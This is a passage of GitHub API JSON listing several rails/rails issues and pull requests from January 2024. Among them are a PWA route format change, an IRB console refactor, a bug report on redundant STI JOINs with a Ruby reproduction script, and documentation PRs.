            "patch_url": "https://github.com/rails/rails/pull/50815.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nAs a followup to #50528, which added default pwa manifest and service worker routes and files to the new app generator, I'd like to associate the new routes with the expected mime types.\r\n\r\n### Detail\r\n\r\nWe expect the `pwa#manifest` request to be limited to json, i.e. `manifest.json` and we expect the `pwa#service_worker` request to be limited to js, i.e. `service-worker.js`. This change adds format constraints to the generated routes.\r\n\r\n### Additional information\r\n\r\nI didn't see associated tests with the previous change but would be open to adding some if desired.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50815/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50815/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50814",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50814/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50814/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50814/events",
        "html_url": "https://github.com/rails/rails/pull/50814",
        "id": 2091519143,
        "node_id": "PR_kwDNIULOZJjUvg",
        "number": 50814,
        "title": "Improve Rails console's IRB autocompletion control",
        "user": {
            "login": "st0012",
            "id": 5079556,
            "node_id": "MDQ6VXNlcjUwNzk1NTY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5079556?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/st0012",
            "html_url": "https://github.com/st0012",
            "followers_url": "https://api.github.com/users/st0012/followers",
            "following_url": "https://api.github.com/users/st0012/following{/other_user}",
            "gists_url": "https://api.github.com/users/st0012/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/st0012/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/st0012/subscriptions",
            "organizations_url": "https://api.github.com/users/st0012/orgs",
            "repos_url": "https://api.github.com/users/st0012/repos",
            "events_url": "https://api.github.com/users/st0012/events{/privacy}",
            "received_events_url": "https://api.github.com/users/st0012/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-19T22:21:54Z",
        "updated_at": "2024-01-20T14:01:57Z",
        "closed_at": "2024-01-20T14:01:14Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50814",
            "html_url": "https://github.com/rails/rails/pull/50814",
            "diff_url": "https://github.com/rails/rails/pull/50814.diff",
            "patch_url": "https://github.com/rails/rails/pull/50814.patch",
            "merged_at": "2024-01-20T14:01:14Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis is a follow up PR for [this comment](https://github.com/rails/rails/pull/50796#discussion_r1459496432) and other small refactors.\r\n\r\n### Detail\r\n\r\nI made small improvements on Rails console related tests and avoided using ENV to control IRB's autocompletion toggle. But none of the change should affect end users.\r\n\r\nI explained each change in their own commits. I can also split them into another PRs if that's preferred.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50814/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50814/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50813",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50813/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50813/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50813/events",
        "html_url": "https://github.com/rails/rails/pull/50813",
        "id": 2091516993,
        "node_id": "PR_kwDNIULOZJjMrw",
        "number": 50813,
        "title": "documentation",
        "user": {
            "login": "Muliro1",
            "id": 22881664,
            "node_id": "MDQ6VXNlcjIyODgxNjY0",
            "avatar_url": "https://avatars.githubusercontent.com/u/22881664?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Muliro1",
            "html_url": "https://github.com/Muliro1",
            "followers_url": "https://api.github.com/users/Muliro1/followers",
            "following_url": "https://api.github.com/users/Muliro1/following{/other_user}",
            "gists_url": "https://api.github.com/users/Muliro1/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Muliro1/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Muliro1/subscriptions",
            "organizations_url": "https://api.github.com/users/Muliro1/orgs",
            "repos_url": "https://api.github.com/users/Muliro1/repos",
            "events_url": "https://api.github.com/users/Muliro1/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Muliro1/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-19T22:20:48Z",
        "updated_at": "2024-01-21T00:48:52Z",
        "closed_at": "2024-01-21T00:47:59Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50813",
            "html_url": "https://github.com/rails/rails/pull/50813",
            "diff_url": "https://github.com/rails/rails/pull/50813.diff",
            "patch_url": "https://github.com/rails/rails/pull/50813.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because [REPLACE ME]\r\n\r\n### Detail\r\n\r\nThis Pull Request changes [REPLACE ME]\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50813/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50813/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50812",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50812/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50812/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50812/events",
        "html_url": "https://github.com/rails/rails/issues/50812",
        "id": 2091410608,
        "node_id": "I_kwDNIULOfKhksA",
        "number": 50812,
        "title": "Redundant JOIN produced when merging relations from STI classes",
        "user": {
            "login": "mintyfresh",
            "id": 7896757,
            "node_id": "MDQ6VXNlcjc4OTY3NTc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/7896757?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mintyfresh",
            "html_url": "https://github.com/mintyfresh",
            "followers_url": "https://api.github.com/users/mintyfresh/followers",
            "following_url": "https://api.github.com/users/mintyfresh/following{/other_user}",
            "gists_url": "https://api.github.com/users/mintyfresh/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mintyfresh/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mintyfresh/subscriptions",
            "organizations_url": "https://api.github.com/users/mintyfresh/orgs",
            "repos_url": "https://api.github.com/users/mintyfresh/repos",
            "events_url": "https://api.github.com/users/mintyfresh/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mintyfresh/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-19T20:59:12Z",
        "updated_at": "2024-01-26T14:10:08Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\nMerging relations with joins to the same association by different classes in an STI tree results in duplicated, redundant JOINs in the emitted SQL.\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n    t.string :type\r\n  end\r\n\r\n  create_table :comments, force: true do |t|\r\n    t.integer :post_id\r\n    t.boolean :published\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\n  has_many :comments\r\n\r\n  scope :with_comments, -> { joins(:comments).where(comments: { published: true }) }\r\nend\r\n\r\nclass CustomPost < Post\r\nend\r\n\r\nclass Comment < ActiveRecord::Base\r\n  belongs_to :post\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_merge_base_case\r\n    posts_with_comments1 = CustomPost.with_comments\r\n    posts_with_comments2 = CustomPost.with_comments\r\n\r\n    assert_equal [:comments], posts_with_comments1.joins_values\r\n    assert_equal [:comments], posts_with_comments2.joins_values\r\n\r\n    combined_scope = posts_with_comments1.merge(posts_with_comments2)\r\n\r\n    puts combined_scope.to_sql\r\n    assert_equal [:comments], combined_scope.joins_values\r\n  end\r\n\r\n  def test_merge_sti_case\r\n    posts_with_comments = Post.with_comments\r\n    custom_posts_with_comments = CustomPost.with_comments\r\n\r\n    assert_equal [:comments], posts_with_comments.joins_values\r\n    assert_equal [:comments], custom_posts_with_comments.joins_values\r\n\r\n    combined_scope = posts_with_comments.merge(custom_posts_with_comments)\r\n\r\n    puts combined_scope.to_sql\r\n    # FAILS! two joins are generated\r\n    assert_equal [:comments], combined_scope.joins_values\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\nA query with a single join to the foreign table is produced\r\ne.g.\r\n```sql\r\nSELECT\r\n  \"posts\".*\r\nFROM\r\n  \"posts\"\r\n  INNER JOIN \"comments\" ON \"comments\".\"post_id\" = \"posts\".\"id\"\r\nWHERE\r\n  \"posts\".\"type\" = 'CustomPost'\r\n  AND \"comments\".\"published\" = 1\r\n```\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\nA query with two redundant joins to the foreign table is produced\r\n```sql\r\nSELECT\r\n  \"posts\".*\r\nFROM\r\n  \"posts\"\r\n  INNER JOIN \"comments\" ON \"comments\".\"post_id\" = \"posts\".\"id\"\r\n  INNER JOIN \"comments\" \"comments_posts\" ON \"comments_posts\".\"post_id\" = \"posts\".\"id\"\r\nWHERE\r\n  \"posts\".\"type\" = 'CustomPost'\r\n  AND \"comments\".\"published\" = 1\r\n```\r\nThis duplicated join is not referenced by the rest of the query in any way\r\n\r\n### System configuration\r\n**Rails version**: Rails 7.1.0\r\n\r\n**Ruby version**: ruby 3.2.2 (2023-03-30 revision e51014f9c0) [x86_64-linux]\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50812/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50812/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50811",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50811/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50811/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50811/events",
        "html_url": "https://github.com/rails/rails/pull/50811",
        "id": 2090495786,
        "node_id": "PR_kwDNIULOZItj4w",
        "number": 50811,
        "title": "Add multiple databases AR bug template [ci skip]",
        "user": {
            "login": "HeyNonster",
            "id": 47484308,
            "node_id": "MDQ6VXNlcjQ3NDg0MzA4",
            "avatar_url": "https://avatars.githubusercontent.com/u/47484308?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/HeyNonster",
            "html_url": "https://github.com/HeyNonster",
            "followers_url": "https://api.github.com/users/HeyNonster/followers",
            "following_url": "https://api.github.com/users/HeyNonster/following{/other_user}",
            "gists_url": "https://api.github.com/users/HeyNonster/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/HeyNonster/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/HeyNonster/subscriptions",
            "organizations_url": "https://api.github.com/users/HeyNonster/orgs",
            "repos_url": "https://api.github.com/users/HeyNonster/repos",
            "events_url": "https://api.github.com/users/HeyNonster/events{/privacy}",
            "received_events_url": "https://api.github.com/users/HeyNonster/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-19T12:54:28Z",
        "updated_at": "2024-01-19T12:58:25Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50811",
            "html_url": "https://github.com/rails/rails/pull/50811",
            "diff_url": "https://github.com/rails/rails/pull/50811.diff",
            "patch_url": "https://github.com/rails/rails/pull/50811.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because there are a few PRs we'd like to open that relate to the multiple database code in Rails but there was no existing template for a multiple database setup.  \r\n\r\n### Detail\r\n\r\nThis commit adds a new bug report template that's based off of the existing [Active Record bug report\r\ntemplate](https://github.com/rails/rails/blob/main/guides/bug_report_templates/active_record.rb) but creates a multiple database setup.\r\n\r\nThe template creates an `UnshardedModel` abstract `ActiveRecord` model that connects to a single database (with a replica configured) and a `ShardedModel` abstract `ActiveRecord` model that has two shards configured, each with their own replica.\r\n\r\nEach sqlite3 in-memory database is separate because [opening multiple database connections each with the filename \":memory:\" will create independent in-memory databases](https://www.sqlite.org/inmemorydb.html).\r\n\r\nNote, that while replica databases are configured, sqlite3 does not support database replication and therefore records written to the writer databases will not auto-populate on the replica/reader databases. The replica configurations are included to allow for testing role switching, not for validating replication itself.\r\n\r\n### Additional information\r\n\r\nYou can test that the template works by running:\r\n\r\n `ruby guides/bug_report_templates/active_record_multiple_databases.rb` \r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50811/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50811/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50810",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50810/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50810/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50810/events",
        "html_url": "https://github.com/rails/rails/pull/50810",
        "id": 2090407034,
        "node_id": "PR_kwDNIULOZIopmA",
        "number": 50810,
        "title": "Add example to parts documentation [ci-skip]",
        "user": {
            "login": "m-nakamura145",
            "id": 11944718,
            "node_id": "MDQ6VXNlcjExOTQ0NzE4",
            "avatar_url": "https://avatars.githubusercontent.com/u/11944718?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/m-nakamura145",
            "html_url": "https://github.com/m-nakamura145",
            "followers_url": "https://api.github.com/users/m-nakamura145/followers",
            "following_url": "https://api.github.com/users/m-nakamura145/following{/other_user}",
            "gists_url": "https://api.github.com/users/m-nakamura145/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/m-nakamura145/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/m-nakamura145/subscriptions",
            "organizations_url": "https://api.github.com/users/m-nakamura145/orgs",
            "repos_url": "https://api.github.com/users/m-nakamura145/repos",
            "events_url": "https://api.github.com/users/m-nakamura145/events{/privacy}",
            "received_events_url": "https://api.github.com/users/m-nakamura145/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-19T12:01:49Z",
        "updated_at": "2024-01-19T14:20:48Z",
        "closed_at": "2024-01-19T14:10:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50810",
            "html_url": "https://github.com/rails/rails/pull/50810",
            "diff_url": "https://github.com/rails/rails/pull/50810.diff",
            "patch_url": "https://github.com/rails/rails/pull/50810.patch",
            "merged_at": "2024-01-19T14:10:25Z"
        },
        "body": "### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50810/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50810/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50809",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50809/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50809/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50809/events",
        "html_url": "https://github.com/rails/rails/pull/50809",
        "id": 2090375127,
        "node_id": "PR_kwDNIULOZIm11Q",
        "number": 50809,
        "title": "Freeze and dedup `quote_column_name` and `quote_table_name` caches",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-19T11:47:53Z",
        "updated_at": "2024-01-19T14:23:56Z",
        "closed_at": "2024-01-19T14:23:56Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50809",
            "html_url": "https://github.com/rails/rails/pull/50809",
            "diff_url": "https://github.com/rails/rails/pull/50809.diff",
            "patch_url": "https://github.com/rails/rails/pull/50809.patch",
            "merged_at": "2024-01-19T14:23:56Z"
        },
        "body": "Ref: https://github.com/rails/rails/pull/48773#discussion_r1453812580\r\n\r\nAvoid corrupting the cache by mutating the return value, and also sligthly reduce memory usage when the quoting format often return an unmodified string.\r\n\r\nFYI: @dkubb ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50809/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50809/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50808",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50808/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50808/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50808/events",
        "html_url": "https://github.com/rails/rails/pull/50808",
        "id": 2090324843,
        "node_id": "PR_kwDNIULOZIj_wg",
        "number": 50808,
        "title": "Add example to modules_for_helpers documentation [ci-skip]",
        "user": {
            "login": "m-nakamura145",
            "id": 11944718,
            "node_id": "MDQ6VXNlcjExOTQ0NzE4",
            "avatar_url": "https://avatars.githubusercontent.com/u/11944718?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/m-nakamura145",
            "html_url": "https://github.com/m-nakamura145",
            "followers_url": "https://api.github.com/users/m-nakamura145/followers",
            "following_url": "https://api.github.com/users/m-nakamura145/following{/other_user}",
            "gists_url": "https://api.github.com/users/m-nakamura145/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/m-nakamura145/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/m-nakamura145/subscriptions",
            "organizations_url": "https://api.github.com/users/m-nakamura145/orgs",
            "repos_url": "https://api.github.com/users/m-nakamura145/repos",
            "events_url": "https://api.github.com/users/m-nakamura145/events{/privacy}",
            "received_events_url": "https://api.github.com/users/m-nakamura145/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-01-19T11:23:44Z",
        "updated_at": "2024-01-19T16:00:42Z",
        "closed_at": "2024-01-19T15:59:37Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50808",
            "html_url": "https://github.com/rails/rails/pull/50808",
            "diff_url": "https://github.com/rails/rails/pull/50808.diff",
            "patch_url": "https://github.com/rails/rails/pull/50808.patch",
            "merged_at": "2024-01-19T15:59:37Z"
        },
        "body": "### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50808/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50808/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50807",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50807/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50807/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50807/events",
        "html_url": "https://github.com/rails/rails/issues/50807",
        "id": 2090245533,
        "node_id": "I_kwDNIULOfJadnQ",
        "number": 50807,
        "title": "Undocumented - validations enabled by autosave",
        "user": {
            "login": "semaperepelitsa",
            "id": 347921,
            "node_id": "MDQ6VXNlcjM0NzkyMQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/347921?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/semaperepelitsa",
            "html_url": "https://github.com/semaperepelitsa",
            "followers_url": "https://api.github.com/users/semaperepelitsa/followers",
            "following_url": "https://api.github.com/users/semaperepelitsa/following{/other_user}",
            "gists_url": "https://api.github.com/users/semaperepelitsa/gists{/gist_id}",
